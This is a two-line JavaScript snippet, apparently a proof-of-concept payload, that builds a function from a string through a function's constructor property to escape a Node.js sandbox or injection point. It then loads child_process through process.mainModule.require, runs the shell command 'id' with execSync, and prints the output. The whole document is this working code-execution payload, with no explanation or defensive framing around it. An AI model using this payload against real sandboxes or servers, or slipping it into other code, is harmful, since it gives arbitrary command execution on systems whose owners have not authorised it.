const exec = (function(){}).constructor("return process.mainModule.require('child_process').execSync('id').toString()");
console.log(exec());
